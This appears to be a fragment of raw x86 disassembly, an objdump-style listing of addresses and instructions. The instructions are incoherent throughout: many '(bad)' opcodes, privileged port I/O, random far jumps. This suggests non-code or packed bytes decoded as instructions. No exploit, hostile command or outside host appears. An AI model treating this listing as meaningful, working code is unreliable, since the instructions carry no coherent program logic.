  421d88:	or     DWORD PTR [edx-0x56],0x37
  421d8c:	mov    al,0xca
  421d8e:	out    0xdf,al
  421d90:	push   esi
  421d91:	leave  
  421d92:	mov    ss,esp
  421d94:	add    al,BYTE PTR [ecx+0x6e8a8970]
  421d9a:	xor    BYTE PTR [edx+0x68],bl
  421d9d:	mov    edi,ecx
  421d9f:	mov    eax,ds:0xe71207d9
  421da4:	push   ecx
  421da5:	(bad)  
  421da6:	xor    BYTE PTR [ecx],dh
  421da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421da9:	push   es
  421daa:	paddusw mm6,QWORD PTR [edx+0x69c961da]
  421db1:	nop
  421db2:	jb     0x421d5f
  421db4:	dec    edi
  421db5:	outs   dx,BYTE PTR ds:[esi]
  421db6:	repnz sti 
  421db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db9:	push   eax
  421dba:	repnz sbb ebp,DWORD PTR ds:0xe8e35bf1
  421dc1:	stos   BYTE PTR es:[edi],al
  421dc2:	push   edi
  421dc3:	inc    eax
  421dc4:	jae    0x421e11
  421dc6:	xchg   DWORD PTR es:[edx-0x374f6875],ecx
  421dcd:	push   cs
  421dce:	outs   dx,DWORD PTR ds:[esi]
  421dcf:	or     ah,bl
  421dd1:	push   eax
  421dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dd3:	xlat   BYTE PTR ds:[ebx]
  421dd4:	mov    ss,WORD PTR [ebp-0x61]
  421dd7:	pop    eax
  421dd8:	mov    esi,0x388b79a6
  421ddd:	add    al,0x54
  421ddf:	jg     0x421db9
  421de1:	loopne 0x421da9
  421de3:	mov    ds:0xabf1d121,eax
  421de8:	arpl   WORD PTR [esi],ax
  421dea:	pop    ecx
  421deb:	mov    esp,0xe8da0b62
  421df0:	cli    
  421df1:	rcl    BYTE PTR [ebp-0x4e6151fb],0x5
  421df8:	jge    0x421dce
  421dfa:	push   ss
  421dfb:	outs   dx,DWORD PTR ds:[esi]
  421dfc:	mov    ch,0xdc
  421dfe:	cdq    
  421dff:	jg     0x421e23
  421e01:	mov    al,es:0x56f57647
  421e07:	mov    ebp,0x193793bf
  421e0c:	adc    cl,BYTE PTR [eax-0x4eb0c6da]
  421e12:	inc    ebp
  421e13:	popf   
  421e14:	add    al,0xcb
  421e16:	clc    
  421e17:	xor    al,0x82
  421e19:	sbb    bh,dl
  421e1b:	pop    ecx
  421e1c:	out    0x9,eax
  421e1e:	sbb    ebx,DWORD PTR [ecx-0x5e]
  421e21:	jecxz  0x421daf
  421e23:	dec    ebx
  421e24:	sub    BYTE PTR [esi+0x4d],al
  421e27:	sbb    bl,BYTE PTR [ebp+0x5b]
  421e2a:	ins    DWORD PTR es:[edi],dx
  421e2b:	adc    eax,DWORD PTR ds:0xf95e3d4
  421e31:	mov    edi,0xbd7a65f6
  421e36:	push   0xffffffb6
  421e38:	mov    edi,0xa231a71b
  421e3d:	xchg   ecx,eax
  421e3e:	cld    
  421e3f:	xor    bh,al
  421e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e42:	aaa    
  421e43:	retf   
  421e44:	xchg   ebp,eax
  421e45:	sub    ah,BYTE PTR [edx+0x18]
  421e48:	call   0xcc31:0x12279a6d
  421e4f:	adc    eax,0x3752eb5
  421e54:	(bad)  
  421e55:	xor    BYTE PTR [ecx],cl
  421e57:	or     DWORD PTR [edx+edx*2-0x77],ecx
  421e5b:	xchg   ebx,eax
  421e5c:	cmp    eax,0x4131fea9
  421e61:	pop    edi
  421e62:	sbb    DWORD PTR [ecx-0x4],ecx
  421e65:	fidivr WORD PTR ds:0x40be36ce
  421e6b:	sbb    DWORD PTR [edx-0x7f],esi
  421e6e:	push   eax
  421e6f:	ins    BYTE PTR es:[edi],dx
  421e70:	mov    ds:0x7494113c,al
  421e75:	sub    bh,BYTE PTR [edi+edi*1]
  421e78:	inc    esp
  421e79:	aaa    
  421e7a:	fnstsw WORD PTR [eax-0x17]
  421e7d:	stc    
  421e7e:	jo     0x421edf
  421e80:	xor    ch,dh
  421e82:	or     al,0xf7
  421e84:	xchg   esi,eax
  421e85:	lds    edi,FWORD PTR [edi]
  421e87:	jno    0x421e50
  421e89:	adc    eax,0xc43ab21b
  421e8e:	mov    ?,esi
  421e90:	push   es
  421e91:	xchg   esi,eax
  421e92:	inc    ebx
  421e93:	bound  esp,QWORD PTR [edx+0x6d3b9161]
  421e99:	mov    bh,0x34
  421e9b:	cmp    al,0x97
  421e9d:	pop    ecx
  421e9e:	pop    es
  421e9f:	dec    edi
  421ea0:	icebp  
  421ea1:	ror    BYTE PTR [eax+0x3e],1
  421ea4:	mov    al,0x80
  421ea6:	add    dh,0x28
  421ea9:	in     eax,dx
  421eaa:	fstp   DWORD PTR [ebx+0x13]
  421ead:	inc    edx
  421eae:	or     BYTE PTR [esi+edx*8+0x32],0xef
  421eb3:	xchg   ebp,eax
  421eb5:	in     eax,0x1d
  421eb7:	fsubr  DWORD PTR [esi]
  421eb9:	pop    edx
  421eba:	xchg   esi,eax
  421ebb:	pop    ss
  421ebc:	mov    esp,0xffa3e0d3
  421ec1:	or     DWORD PTR [ebx-0x45087b04],0xffffffdc
  421ec8:	mov    esi,0x743f17e
  421ecd:	inc    eax
  421ece:	cmp    BYTE PTR [edx],ch
  421ed0:	cmp    cl,BYTE PTR [esi+0x51]
  421ed3:	loop   0x421f44
  421ed5:	xchg   dx,ax
  421ed7:	jmp    0xce003164
  421edc:	cmp    eax,0x3351d723
  421ee1:	ins    BYTE PTR es:[di],dx
  421ee3:	inc    DWORD PTR [ecx+0x5d]
  421ee6:	inc    ecx
  421ee7:	dec    edi
  421ee8:	rcl    BYTE PTR [ecx-0x37],0xd9
  421eec:	(bad)  
  421eed:	mov    cl,BYTE PTR [ebx-0x62]
  421ef0:	push   ecx
  421ef1:	xlat   BYTE PTR ds:[ebx]
  421ef2:	add    al,0x46
  421ef4:	pop    ebx
  421ef5:	loope  0x421f16
  421ef7:	inc    esi
  421ef8:	addr16 sahf 
  421efa:	adc    eax,0x185c428d
  421eff:	out    0x48,al
  421f01:	jo     0x421eb4
  421f03:	xchg   edi,eax
  421f04:	xlat   BYTE PTR ds:[ebx]
  421f05:	xchg   ebx,eax
  421f06:	xor    edx,DWORD PTR [esi-0x7c]
  421f09:	push   ebx
  421f0a:	dec    edx
  421f0b:	mov    dl,0xb0
  421f0d:	push   0x42
  421f0f:	jmp    0xe3ae:0x88a6114e
  421f16:	ja     0x421ed9
  421f18:	adc    BYTE PTR [esp+edi*4-0x34],ah
  421f1c:	jg     0x421f92
  421f1e:	cmp    BYTE PTR [eax+0x4a],ch
  421f21:	ins    BYTE PTR es:[edi],dx
  421f22:	push   ebx
  421f23:	xor    eax,0xf0ba46e6
  421f28:	xlat   BYTE PTR ds:[ebx]
  421f29:	mov    bl,0x85
  421f2b:	stos   BYTE PTR es:[edi],al
  421f2c:	pop    eax
  421f2d:	cmp    eax,DWORD PTR [esi]
  421f2f:	call   0xee1:0x5a21a69b
  421f36:	je     0x421ee7
  421f38:	inc    ebp
  421f39:	mov    ds:0xd7c4e9c6,eax
  421f3e:	jno    0x421ef1
  421f40:	in     eax,dx
  421f41:	gs push esi
  421f43:	or     BYTE PTR [eax],cl
  421f45:	jp     0x421f93
  421f47:	scas   eax,DWORD PTR es:[edi]
  421f48:	inc    esi
  421f49:	ss test eax,0xea01c31a
  421f4f:	aad    0x0
  421f51:	ror    ch,cl
  421f53:	push   eax
  421f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f55:	test   DWORD PTR [ebp+0xb],0xdbe66df2
  421f5c:	out    dx,al
  421f5d:	and    eax,0x1efd452b
  421f62:	test   al,0x75
  421f64:	lahf   
  421f65:	jg     0x421fdc
  421f67:	sub    DWORD PTR [ebp-0x4f],eax
  421f6a:	push   esi
  421f6b:	les    ebp,FWORD PTR [ecx]
  421f6d:	pop    edx
  421f6e:	sub    eax,0xd2c565a8
  421f74:	aaa    
  421f75:	fs mov esi,0xdce7f55
  421f7b:	test   DWORD PTR [ecx+0x713bf3be],0x5f54ca63
  421f85:	adc    ah,BYTE PTR [edi]
  421f87:	popa   
  421f88:	loopne 0x421f4b
  421f8a:	fdiv   DWORD PTR [edx+0x4f377a73]
  421f90:	ss push 0x59
  421f93:	pusha  
  421f94:	adc    esi,DWORD PTR [esi+0x2a]
  421f97:	nop
  421f98:	jg     0x421fcc
  421f9a:	add    bh,BYTE PTR [ebx+ebp*1-0x591fa2c4]
  421fa1:	aam    0x3a
  421fa3:	pop    esi
  421fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa5:	adc    al,0x5a
  421fa7:	and    DWORD PTR [eax+0x30659e9b],esi
  421fad:	inc    esp
  421fae:	popa   
  421faf:	fwait
  421fb0:	mov    edi,0x7a101b79
  421fb5:	mov    WORD PTR ds:0xbd938ec2,gs
  421fbb:	xchg   DWORD PTR [ecx+0x86741e3],edx
  421fc1:	sbb    DWORD PTR [edi+esi*4],eax
  421fc4:	cld    
  421fc5:	pop    ecx
  421fc6:	push   esi
  421fc7:	inc    edx
  421fc8:	iret   
  421fc9:	addr16 (bad) 
  421fcc:	lods   eax,DWORD PTR ds:[esi]
  421fcd:	sub    dl,BYTE PTR [esp+eax*2]
  421fd0:	hlt    
  421fd1:	jae    0x422003
  421fd3:	and    eax,0x9dd5ec5f
  421fd8:	ror    DWORD PTR [esi-0x27d68be0],1
  421fde:	dec    eax
  421fdf:	test   eax,0xb7580776
  421fe4:	jg     0x421f6a
  421fe6:	call   0xa95b:0x8d3fca0
  421fed:	sbb    DWORD PTR [eax+0x15191838],0xca291ae3
  421ff7:	push   cs
  421ff8:	test   BYTE PTR [esi+0x64],dl
  421ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ffc:	xor    edx,DWORD PTR [edi]
  421ffe:	and    al,0x8b
  422000:	push   esp
  422001:	adc    al,0x8d
  422003:	or     BYTE PTR [edx-0x47852279],dl
  422009:	push   esi
  42200a:	xchg   edx,eax
  42200b:	pop    ebp
  42200c:	xchg   ecx,eax
  42200d:	sar    BYTE PTR [ebp+0x2b],1
  422010:	fimul  DWORD PTR gs:[ebp-0x2eb2f063]
  422017:	jb     0x421fc8
  422019:	cmp    esp,ebx
  42201b:	aaa    
  42201c:	push   ebp
  42201d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42201e:	mov    ecx,DWORD PTR [eax]
  422020:	xor    BYTE PTR [edx+0x5f],ch
  422023:	popa   
  422024:	push   esp
  422025:	out    dx,eax
  422026:	imul   esi,DWORD PTR [eax-0x38],0x756dcfcf
  42202d:	mov    es,WORD PTR [eax-0x7e]
  422030:	data16 je 0x422097
  422033:	jns    0x422072
  422035:	pop    eax
  422036:	push   ebx
  422037:	pop    edi
  422038:	and    bl,al
  42203a:	or     ebx,DWORD PTR [esi+0x47d74389]
  422040:	xor    DWORD PTR [eax+ebp*4+0x7bb511ff],0xffffffa4
  422048:	rcr    bl,1
  42204a:	inc    ebp
  42204b:	fimul  WORD PTR [eax+eax*4-0x27]
  42204f:	mov    bl,0xcf
  422051:	add    al,0xf8
  422053:	std    
  422054:	sti    
  422055:	out    0x1e,eax
  422057:	hlt    
  422058:	sub    bh,0xa1
  42205b:	shl    bl,1
  42205d:	adc    DWORD PTR [ecx],0xffffffc5
  422060:	pop    ebx
  422061:	push   ecx
  422062:	dec    ecx
  422063:	mov    edi,esi
  422065:	fiadd  DWORD PTR [edi]
  422067:	add    bh,BYTE PTR [edi-0x44]
  42206a:	(bad)  
  42206b:	xor    al,0x8a
  42206d:	ret    0x724b
  422070:	inc    esi
  422071:	pop    ss
  422072:	stc    
  422073:	pop    ebp
  422074:	sbb    eax,DWORD PTR [ebx]
  422076:	inc    esi
  422077:	sub    al,0x9a
  422079:	xchg   esi,eax
  42207a:	and    bl,BYTE PTR [ebx+0x54]
  42207d:	int3   
  42207e:	je     0x422074
  422080:	icebp  
  422081:	shl    DWORD PTR [ebp+0x31],0x6b
  422085:	push   es
  422086:	sub    DWORD PTR [ebp+0x5ab621f8],edx
  42208c:	and    al,0xc6
  42208e:	and    BYTE PTR [ebx-0x513f3083],bh
  422094:	jmp    0x4ae1dc6d
  422099:	std    
  42209a:	and    eax,0xea783cc9
  42209f:	dec    edi
  4220a0:	fcomp  st(0)
  4220a2:	lds    ebp,FWORD PTR [edi-0x2012fb8f]
  4220a8:	inc    edx
  4220a9:	cwde   
  4220aa:	int    0x26
  4220ac:	sub    bh,BYTE PTR [ecx]
  4220ae:	cmp    ah,BYTE PTR [ebx-0x13]
  4220b1:	(bad)  
  4220b2:	xlat   BYTE PTR ds:[ebx]
  4220b3:	ds mov edi,0xe861a5ab
  4220b9:	test   al,0xcd
  4220bb:	or     al,0x9e
  4220bd:	mov    ah,BYTE PTR [eax]
  4220bf:	mov    esp,0x6436b0e6
  4220c4:	push   0x62fb7bd8
  4220c9:	inc    eax
  4220ca:	mov    ch,0x52
  4220cc:	cmp    al,0xd2
  4220ce:	fistp  WORD PTR [ebp+0x3aeeafbc]
  4220d4:	sti    
  4220d5:	fdivr  st,st(1)
  4220d7:	dec    edi
  4220d8:	push   edi
  4220d9:	in     al,0x5a
  4220db:	ret    
  4220dc:	sbb    dh,BYTE PTR [eax]
  4220de:	adc    al,0x9
  4220e0:	push   cs
  4220e1:	fchs   
  4220e3:	adc    al,0x85
  4220e5:	scas   al,BYTE PTR es:[edi]
  4220e6:	sbb    eax,0x2d13b587
  4220eb:	ins    DWORD PTR es:[edi],dx
  4220ec:	bswap  ebp
  4220ee:	enter  0x43dc,0x86
  4220f2:	pop    esi
  4220f3:	mov    esp,0x2693cdf5
  4220f8:	cmp    edx,DWORD PTR [edx]
  4220fa:	add    eax,0x931269a0
  4220ff:	sub    BYTE PTR [ecx-0x37],bh
  422102:	xor    edx,DWORD PTR [esi-0x1]
  422105:	add    eax,DWORD PTR [edi-0x47]
  422108:	jge    0x42209d
  42210a:	cmp    BYTE PTR [eax-0x76],dh
  42210d:	push   ds
  42210e:	mov    edx,0x4fc28ae
  422113:	int3   
  422114:	jp     0x4220ce
  422116:	jmp    0x422187
  422118:	mov    bl,0x46
  42211a:	add    dl,BYTE PTR [esi-0x71]
  42211d:	mov    ah,0x92
  42211f:	add    BYTE PTR [edx],cl
  422121:	inc    edi
  422122:	sqrtps xmm1,XMMWORD PTR [ecx-0x6648055]
  422129:	int3   
  42212a:	jmp    0x422131
  42212c:	cmp    eax,0xbef30df3
  422131:	jg     0x422136
  422133:	push   ebp
  422134:	push   cx
  422136:	int3   
  422137:	daa    
  422138:	mov    dl,BYTE PTR [ebx-0x16306cfb]
  42213e:	scas   eax,DWORD PTR es:[edi]
  42213f:	cs lahf 
  422141:	fcomi  st,st(2)
  422143:	xor    DWORD PTR [edi+0x5a],edi
  422146:	xor    al,0x57
  422148:	push   esi
  422149:	int3   
  42214a:	outs   dx,BYTE PTR ds:[esi]
  42214b:	cli    
  42214c:	js     0x422189
  42214e:	push   edi
  42214f:	pushf  
  422150:	(bad)  
  422152:	jge    0x4220d6
  422154:	jg     0x422170
  422156:	add    al,BYTE PTR [ebx-0x2072eda5]
  42215c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42215d:	rol    BYTE PTR [edi+0x13ae8cd2],0xf1
  422164:	push   ebp
  422165:	jle    0x4221c1
  422167:	mov    bh,0x55
  422169:	rcl    DWORD PTR [edi+0x6affca14],cl
  42216f:	jne    0x42210b
  422171:	mov    ds:0xe3fb7373,al
  422176:	(bad)  
  422178:	and    dh,dh
  42217a:	cli    
  42217b:	or     ebx,esp
  42217d:	cld    
  42217e:	push   ds
  42217f:	aad    0xe3
  422181:	je     0x422120
  422183:	add    DWORD PTR [esi+edi*2],0xfffffff0
  422187:	mov    edi,DWORD PTR [esi+0x111a0dcd]
  42218d:	jae    0x42215d
  42218f:	dec    ecx
  422190:	dec    edi
  422191:	pop    ebp
  422192:	dec    edx
  422193:	clc    
  422194:	pop    ebx
  422195:	xor    eax,0xe92ccc15
  42219a:	inc    eax
  42219b:	push   edi
  42219c:	std    
  42219d:	loopne 0x42214a
  42219f:	cli    
  4221a0:	fstp   TBYTE PTR ds:0xe9630c77
  4221a6:	or     BYTE PTR [esi],dl
  4221a8:	rcr    BYTE PTR [edi+0x32],cl
  4221ab:	jnp    0x42218b
  4221ad:	ds js  0x42218d
  4221b0:	add    DWORD PTR [eax-0x24],edx
  4221b3:	adc    al,0xaa
  4221b5:	out    dx,eax
  4221b6:	cmp    DWORD PTR [esp+edx*1-0x6330a90d],ebp
  4221bd:	ins    BYTE PTR es:[edi],dx
  4221be:	popa   
  4221bf:	hlt    
  4221c0:	inc    edi
  4221c1:	psubusb mm3,QWORD PTR [esi]
  4221c4:	xor    DWORD PTR [edi],ecx
  4221c6:	adc    esi,DWORD PTR [eax]
  4221c8:	inc    edi
  4221c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221ca:	mov    ebx,0xd9fbc3b5
  4221cf:	push   edi
  4221d0:	and    dh,BYTE PTR [eax+0x5ff4c5a1]
  4221d6:	push   esi
  4221d7:	je     0x4221e0
  4221d9:	inc    edx
  4221da:	cmp    eax,0x3cda3582
  4221df:	js     0x422236
  4221e1:	ffree  st(1)
  4221e3:	scas   al,BYTE PTR es:[edi]
  4221e4:	add    eax,DWORD PTR [ebp-0x7cec8059]
  4221ea:	pop    ebx
  4221eb:	adc    esp,esi
  4221ed:	scas   al,BYTE PTR es:[edi]
  4221ee:	inc    edi
  4221ef:	mov    eax,ds:0xd251248f
  4221f4:	xchg   ebx,eax
  4221f5:	inc    ebp
  4221f6:	mov    ch,0x7c
  4221f8:	cwde   
  4221f9:	pop    eax
  4221fa:	outs   dx,DWORD PTR ds:[esi]
  4221fb:	sub    bl,al
  4221fd:	js     0x4221a4
  4221ff:	sahf   
  422200:	rcl    DWORD PTR [ecx+0xc6d65a3],cl
  422206:	iret   
  422207:	or     dl,BYTE PTR [esi+0x1a5c66f0]
  42220d:	jl     0x4221b8
  42220f:	outs   dx,DWORD PTR ds:[esi]
  422210:	aad    0xe9
  422212:	repnz fmul st,st(5)
  422215:	pushf  
  422216:	int    0xff
  422218:	adc    al,bl
  42221a:	in     eax,dx
  42221b:	xchg   edi,ebx
  42221d:	push   0x754ffccb
  422222:	sbb    bh,al
  422224:	int    0x3a
  422226:	sub    cl,0x2a
  422229:	inc    edx
  42222a:	sub    cl,BYTE PTR [esi+eiz*8]
  42222d:	add    DWORD PTR [ebx],esp
  42222f:	fmul   st(6),st
  422231:	xor    DWORD PTR [eax],esp
  422233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422234:	xor    ebp,0x82f33f3d
  42223a:	mov    ebx,0x620bcd74
  42223f:	popa   
  422240:	out    dx,eax
  422241:	jmp    0x422202
  422243:	mov    dh,0xcc
  422245:	cmp    DWORD PTR [edi-0x7b],esp
  422248:	and    eax,0xb048d66f
  42224d:	mov    bl,0x30
  42224f:	lods   al,BYTE PTR ds:[esi]
  422250:	jle    0x42223c
  422252:	fnstsw WORD PTR [ebp+edx*8-0x51]
  422256:	dec    ebp
  422257:	sbb    DWORD PTR [edx+0x4b486447],ebp
  42225d:	mov    ds:0xe80ca190,al
  422262:	ja     0x4221ee
  422264:	sbb    eax,0x8678aa19
  422269:	shl    DWORD PTR [edx+0x26],cl
  42226c:	or     ecx,DWORD PTR [ecx]
  42226e:	cmp    edi,DWORD PTR [esi]
  422270:	fimul  WORD PTR [ebx-0xe4c9174]
  422276:	outs   dx,DWORD PTR ds:[esi]
  422277:	lock jp 0x422284
  42227a:	adc    ah,BYTE PTR [edx]
  42227c:	add    bh,bl
  42227e:	cmp    esp,DWORD PTR [eax+0x11ed4285]
  422284:	pop    ds
  422285:	jo     0x422207
  422287:	jp     0x42226f
  422289:	mov    BYTE PTR [eax+0x30083fa4],dl
  42228f:	in     al,dx
  422290:	outs   dx,DWORD PTR ds:[esi]
  422291:	cmp    al,0x25
  422293:	jne    0x4222a8
  422295:	cwde   
  422296:	jbe    0x4222d2
  422298:	mov    bh,0xf5
  42229a:	out    dx,eax
  42229b:	or     DWORD PTR [ebp-0x3b],esi
  42229e:	push   esi
  42229f:	adc    eax,ecx
  4222a1:	sub    eax,0xa97a50
  4222a6:	add    BYTE PTR [eax],al
  4222a8:	add    BYTE PTR [eax],al
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0xb5fcbbdc,eax
  4222b9:	dec    edi
  4222ba:	push   0x830001b1
  4222bf:	push   es
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	pusha  
  4222c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c4:	shl    BYTE PTR [ecx-0x3b6d8bdc],1
  4222ca:	mov    al,ds:0xad100997
  4222cf:	or     eax,0xc93486c4
  4222d4:	xchg   ebp,eax
  4222d5:	outs   dx,DWORD PTR ds:[esi]
  4222d6:	pcmpgtw mm5,mm5
  4222d9:	jo     0x42225e
  4222db:	cld    
  4222dc:	out    0x8f,eax
  4222de:	mov    ch,0x1f
  4222e0:	ds mov ebx,0x1c898c0d
  4222e6:	(bad)  
  4222e7:	push   ebx
  4222e8:	sbb    bh,BYTE PTR ds:[ebx-0x6b]
  4222ec:	repz das 
  4222ee:	out    0xf0,al
  4222f0:	push   esi
  4222f1:	ret    0x9b9b
  4222f4:	xchg   DWORD PTR [esi+ebx*8-0x18],edi
  4222f8:	das    
  4222f9:	mov    bl,ch
  4222fb:	or     esp,DWORD PTR [edi-0x63]
  4222fe:	stos   BYTE PTR es:[edi],al
  4222ff:	(bad)  [edi-0x2]
  422302:	cwde   
  422303:	jge    0x42237c
  422305:	(bad)  
  422306:	rcl    BYTE PTR [ebx-0x62],cl
  422309:	test   eax,0xe86dd9ee
  42230e:	mov    ?,ebx
  422310:	and    bh,ah
  422312:	xchg   esp,eax
  422313:	in     eax,dx
  422314:	lods   al,BYTE PTR ds:[esi]
  422315:	shl    DWORD PTR [edi],1
  422317:	icebp  
  422318:	mov    ebp,0x5a6d0882
  42231d:	push   edx
  42231e:	in     eax,0xc7
  422320:	sbb    bh,BYTE PTR [eax+0x7b]
  422323:	shl    BYTE PTR [esp+edx*8+0x70],0x14
  422328:	xor    DWORD PTR [esi-0x54cdc281],ebx
  42232e:	push   ss
  42232f:	fdiv   st,st(6)
  422331:	call   0x5f2:0x6bd3b022
  422338:	mov    edi,0x91e7cab2
  42233d:	test   eax,0xc4766b3b
  422342:	stos   BYTE PTR es:[edi],al
  422343:	popa   
  422344:	or     dh,ch
  422346:	jmp    0x422360
  422348:	rcr    BYTE PTR fs:[ebp-0x12],1
  42234c:	mov    al,0x56
  42234e:	xchg   edi,eax
  42234f:	and    eax,0xa9c82c40
  422354:	jo     0x422369
  422356:	retf   0x5924
  422359:	mov    WORD PTR [ecx-0x63],?
  42235c:	ror    BYTE PTR [esi],cl
  42235e:	jmp    0x4223b5
  422360:	call   0x7466:0x771b9b8e
  422367:	add    DWORD PTR [eax-0x50],eax
  42236a:	int    0x2
  42236c:	leave  
  42236d:	sub    bl,BYTE PTR [edx+0x4577c4ae]
  422373:	jg     0x42230e
  422375:	(bad)  
  422376:	mov    ds:0x74f19fbb,eax
  42237b:	inc    ebp
  42237c:	cmp    BYTE PTR [edx+0x4],cl
  42237f:	gs jp  0x422328
  422382:	loope  0x4223a6
  422384:	js     0x4223fb
  422386:	push   esi
  422387:	mov    al,0x2
  422389:	xchg   ecx,eax
  42238a:	xchg   DWORD PTR [edx+eiz*8-0x21],ecx
  42238e:	or     al,0x94
  422390:	jmp    0x4223aa
  422392:	retf   0xde3b
  422395:	stos   BYTE PTR es:[edi],al
  422396:	sub    dl,BYTE PTR [edi-0x19295ba5]
  42239c:	aam    0x2
  42239e:	das    
  42239f:	jae    0x422354
  4223a1:	pop    eax
  4223a2:	lods   al,BYTE PTR ds:[esi]
  4223a3:	or     eax,0x65aed8e3
  4223a8:	dec    eax
  4223a9:	and    ch,BYTE PTR [eax]
  4223ab:	mov    ah,0x95
  4223ad:	xchg   ecx,ebp
  4223af:	fdiv   st(2),st
  4223b1:	fs mov eax,0x88d84f51
  4223b7:	cs inc esi
  4223b9:	aas    
  4223ba:	jbe    0x4223f2
  4223bc:	lea    edx,[ebx+0x2e]
  4223bf:	push   esp
  4223c0:	stos   DWORD PTR es:[edi],eax
  4223c1:	sub    al,0xcb
  4223c3:	xor    eax,0x22f9ffbb
  4223c8:	bnd jl 0x422440
  4223cb:	ss push 0xa8e53fd9
  4223d1:	out    dx,al
  4223d2:	repz cmc 
  4223d4:	icebp  
  4223d5:	jmp    0x4223b8
  4223d7:	in     eax,dx
  4223d8:	neg    DWORD PTR ss:[ecx-0x185ce48c]
  4223df:	sti    
  4223e0:	xor    DWORD PTR [ebp-0x22dfa272],ebp
  4223e6:	pop    eax
  4223e7:	icebp  
  4223e8:	addr16 leave 
  4223ea:	sbb    edi,DWORD PTR [eax]
  4223ec:	mov    BYTE PTR [edx],al
  4223ee:	rcl    DWORD PTR [edx+0x14],cl
  4223f1:	test   BYTE PTR [eax+0x2d9b7654],bl
  4223f7:	inc    ebx
  4223f8:	scas   al,BYTE PTR es:[edi]
  4223f9:	ins    BYTE PTR es:[edi],dx
  4223fa:	(bad)  
  4223fb:	push   ebp
  4223fc:	push   0x3feb4889
  422401:	or     al,0xdb
  422403:	xor    DWORD PTR [edi+0x72],0xffffffd3
  422407:	dec    esp
  422408:	mov    ch,BYTE PTR [ecx-0x46]
  42240b:	xchg   edi,eax
  42240c:	mov    DWORD PTR [esp+edx*4],eax
  42240f:	lods   eax,DWORD PTR ds:[esi]
  422410:	aad    0x97
  422412:	adc    eax,0x66f74a10
  422417:	bound  ebp,QWORD PTR [ecx+ecx*4]
  42241a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42241b:	gs push esi
  42241d:	mov    al,0x79
  42241f:	cdq    
  422420:	sub    DWORD PTR [ebp-0x7bf237aa],edi
  422426:	repz cmp dl,bh
  422429:	and    dh,BYTE PTR [ecx+edi*8-0x72c8eecb]
  422430:	pusha  
  422431:	(bad)  
  422432:	xor    bh,BYTE PTR [eax+0x50]
  422435:	add    BYTE PTR [esi],ah
  422437:	leave  
  422438:	mov    BYTE PTR [esi+0x62],bl
  42243b:	or     ah,dl
  42243d:	arpl   WORD PTR [edx+0x4b94e607],cx
  422443:	jge    0x422400
  422445:	lods   al,BYTE PTR ds:[esi]
  422446:	mov    al,ds:0xb23736ec
  42244b:	neg    DWORD PTR [edi]
  42244d:	push   esi
  42244e:	jae    0x422444
  422450:	jns    0x4223d3
  422452:	fstp   DWORD PTR [ebp+edx*4+0xc37bcfd]
  422459:	adc    esi,ebp
  42245b:	pop    es
  42245c:	sbb    edi,DWORD PTR [edi]
  42245e:	arpl   ax,dx
  422460:	push   esi
  422461:	lods   eax,DWORD PTR ds:[esi]
  422462:	(bad)  
  422464:	add    al,0xac
  422466:	jecxz  0x4224a8
  422468:	cmp    BYTE PTR [edi],al
  42246a:	jge    0x42243e
  42246c:	xchg   DWORD PTR [ebx+eiz*8-0x5e44657f],esi
  422473:	sub    edi,ebx
  422475:	and    BYTE PTR [ebp-0x67],bh
  422478:	imul   edx,ebx,0x1
  42247b:	les    edi,FWORD PTR [eax-0x52]
  42247e:	mov    esp,0x46479395
  422483:	idiv   BYTE PTR [eax+ebp*2]
  422486:	add    al,0x7
  422488:	push   0xe45837c1
  42248d:	jle    0x4224d9
  42248f:	aad    0xfd
  422491:	lea    esi,[esi+0x2]
  422494:	xor    al,0xc3
  422496:	(bad)  
  422498:	repz ja 0x422469
  42249b:	sub    ch,dh
  42249d:	cs xchg edx,eax
  42249f:	fisttp WORD PTR [ebp+0xf]
  4224a2:	sbb    eax,0xcfa778ba
  4224a7:	loope  0x422459
  4224a9:	lods   eax,DWORD PTR ds:[esi]
  4224aa:	add    DWORD PTR [esi+0x17f4236a],edi
  4224b0:	gs popa 
  4224b2:	(bad)
  4224b6:	push   0x31
  4224b8:	(bad)  
  4224b9:	sahf   
  4224ba:	rcl    eax,1
  4224bc:	out    0xa1,al
  4224be:	jmp    0xc11f:0x996cb9bd
  4224c5:	es and eax,0x838cf781
  4224cb:	retf   0xc9a3
  4224ce:	xor    DWORD PTR [edi+0x28209d9c],edi
  4224d4:	enter  0x57e2,0xc
  4224d8:	and    BYTE PTR [ebx+0x2d],ch
  4224db:	inc    eax
  4224dc:	pop    ss
  4224dd:	mov    ds:0x3a6736ed,eax
  4224e2:	shl    DWORD PTR [ecx],0x17
  4224e5:	mov    eax,ds:0xd4d85f40
  4224ea:	aaa    
  4224eb:	repz fwait
  4224ed:	stc    
  4224ee:	mov    ebx,0x1267e96b
  4224f3:	mov    BYTE PTR [edx-0x56ec4089],0x8
  4224fa:	(bad)  
  4224fb:	in     al,dx
  4224fc:	mov    esi,0xa432b24e
  422501:	dec    ecx
  422502:	jle    0x4224f0
  422504:	(bad)  [edx]
  422506:	add    eax,0xbd8208ac
  42250b:	or     edi,DWORD PTR [ebx+eiz*2-0x46f6e4f0]
  422512:	xor    al,0x5d
  422514:	out    0x1,eax
  422516:	xlat   BYTE PTR ds:[ebx]
  422517:	xor    DWORD PTR [esi-0x3c],ebx
  42251a:	xchg   ch,al
  42251c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42251d:	sbb    eax,0xa1719c1d
  422522:	dec    ebx
